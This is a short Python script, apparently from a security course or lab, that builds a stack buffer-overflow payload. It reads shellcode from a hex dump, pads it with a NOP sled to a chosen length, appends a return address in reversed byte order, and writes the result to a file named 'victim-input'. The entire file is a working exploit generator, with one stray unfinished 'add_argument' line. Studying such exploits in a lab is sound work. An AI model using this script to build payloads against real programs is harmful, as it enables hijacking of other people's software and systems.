import argparse

parser = argparse.ArgumentParser()
parser.add_argument('size', type=int, help='size of attack string')
parser.add_argument('return_addr', type=int)
parser.add_argument
args = parser.parse_args()

with open('shellcode_hex', 'r') as f:
    lines = list(f)[2:-1]

code = ''
for i in lines:
    code += ''.join(i[:50].split()[1:-1])

attk_str = bytes.fromhex(code[:-2])
addr = "%x"%args.return_addr
if len(addr) % 2 == 1:
    addr = '0' + addr

left = args.size - len(attk_str) - len(addr)//2
attk_str = b'\x90'*left + attk_str
print(addr)
addr_bytes = list(zip(addr[::2], addr[1::2]))
addr = ''.join(''.join(i) for i in reversed(addr_bytes))
print(addr)

attk_str += bytes.fromhex(addr)   
with open('victim-input', 'wb') as f:
    f.write(attk_str)
